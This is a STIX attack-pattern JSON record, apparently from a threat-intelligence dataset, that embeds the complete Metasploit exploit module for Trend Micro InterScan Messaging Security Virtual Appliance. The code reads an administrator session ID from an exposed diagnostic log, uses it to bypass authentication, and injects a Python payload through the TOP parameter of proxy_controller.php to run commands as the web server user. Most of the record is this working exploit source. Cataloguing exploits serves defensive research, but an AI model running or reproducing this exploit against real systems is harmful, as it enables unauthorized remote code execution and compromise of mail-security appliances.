{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c505567a-dc27-40d4-8938-67de7afdc735",
    "created": "2024-08-14T17:02:35.314564Z",
    "modified": "2024-08-14T17:02:35.314568Z",
    "name": "\"Trend Micro InterScan Messaging Security (Virtual Appliance) Remote Code Execution\"",
    "description": " This module exploits the authentication bypass and command injection vulnerability together. Unauthenticated users can execute a terminal command under the context of the web server user.  The specific flaw exists within the management interface, which listens on TCP port 443 by default. Trend Micro IMSVA product have widget feature which is implemented with PHP. Insecurely configured web server exposes diagnostic.log file, which leads to an extraction of JSESSIONID value from administrator session. Proxy.php files under the mod TMCSS folder takes multiple parameter but the process does not properly validate a user-supplied string before using it to execute a system call. Due to combination of these vulnerabilities unauthenticated users can execute a terminal command under the context of the web server user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/trendmicro_imsva_widget_exec.rb",
            "external_id": "trendmicro_imsva_widget_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://pentest.blog/one-ring-to-rule-them-all-same-rce-on-multiple-trend-micro-products/"
        },
        {
            "source_name": "reference",
            "url": "http://www.zerodayinitiative.com/advisories/ZDI-17-521/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Trend Micro InterScan Messaging Security (Virtual Appliance) Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits the authentication bypass and command injection vulnerability together. Unauthenticated users can execute a\n        terminal command under the context of the web server user.\n\n        The specific flaw exists within the management interface, which listens on TCP port 443 by default. Trend Micro IMSVA product\n        have widget feature which is implemented with PHP. Insecurely configured web server exposes diagnostic.log file, which\n        leads to an extraction of JSESSIONID value from administrator session. Proxy.php files under the mod TMCSS folder takes multiple parameter but the process\n        does not properly validate a user-supplied string before using it to execute a system call. Due to combination of these vulnerabilities,\n        unauthenticated users can execute a terminal command under the context of the web server user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'mr_me <mr_me@offensive-security.com>', # author of command injection\n          'Mehmet Ince <mehmet@mehmetince.net>' # author of authentication bypass & msf module\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://pentest.blog/one-ring-to-rule-them-all-same-rce-on-multiple-trend-micro-products/'],\n          ['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-17-521/'],\n        ],\n      'DefaultOptions'  =>\n        {\n          'SSL' => true,\n          'RPORT' => 8445\n        },\n      'Payload'        =>\n        {\n          'Compat'      =>\n            {\n              'ConnectionType' => '-bind'\n            },\n        },\n      'Platform'       => ['python'],\n      'Arch'           => ARCH_PYTHON,\n      'Targets'        => [[ 'Automatic', {}]],\n      'Privileged'     => false,\n      'DisclosureDate' => '2017-10-07',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI of the Trend Micro IMSVA management interface', '/'])\n      ]\n    )\n  end\n\n  def extract_jsessionid\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'widget', 'repository', 'log', 'diagnostic.log')\n    })\n    if res && res.code == 200 && res.body.include?('JSEEEIONID')\n      res.body.scan(/JSEEEIONID:([A-F0-9]{32})/).flatten.last\n    else\n      nil\n    end\n  end\n\n  def widget_auth(jsessionid)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'widget', 'index.php'),\n      'cookie' => \"CurrentLocale=en-U=en_US; JSESSIONID=#{jsessionid}\"\n    })\n    if res && res.code == 200 && res.body.include?('USER_GENERATED_WIDGET_DIR')\n      res.get_cookies\n    else\n      nil\n    end\n  end\n\n  def check\n    # If we've managed to bypass authentication, that means target is most likely vulnerable.\n    jsessionid = extract_jsessionid\n    if jsessionid.nil?\n      return Exploit::CheckCode::Safe\n    end\n    auth = widget_auth(jsessionid)\n    if auth.nil?\n      Exploit::CheckCode::Safe\n    else\n      Exploit::CheckCode::Appears\n    end\n  end\n\n  def exploit\n    print_status('Extracting JSESSIONID from publicly accessible log file')\n    jsessionid = extract_jsessionid\n    if jsessionid.nil?\n      fail_with(Failure::NotVulnerable, \"Target is not vulnerable.\")\n    else\n      print_good(\"Awesome. JSESSIONID value = #{jsessionid}\")\n    end\n\n    print_status('Initiating session with widget framework')\n    cookies = widget_auth(jsessionid)\n    if cookies.nil?\n      fail_with(Failure::NoAccess, \"Latest JSESSIONID is expired. Wait for sysadmin to login IMSVA\")\n    else\n      print_good('Session with widget framework successfully initiated.')\n    end\n\n    print_status('Trigerring command injection vulnerability')\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'widget', 'proxy_controller.php'),\n      'cookie' => \"CurrentLocale=en-US; LogonUser=root; JSESSIONID=#{jsessionid}; #{cookies}\",\n      'vars_post' => {\n        'module' => 'modTMCSS',\n        'serverid' => '1',\n        'TOP' => \"$(python -c \\\"#{payload.encoded}\\\")\"\n      }\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-10-07",
    "x_mitre_platforms": [
        "['python']"
    ]
}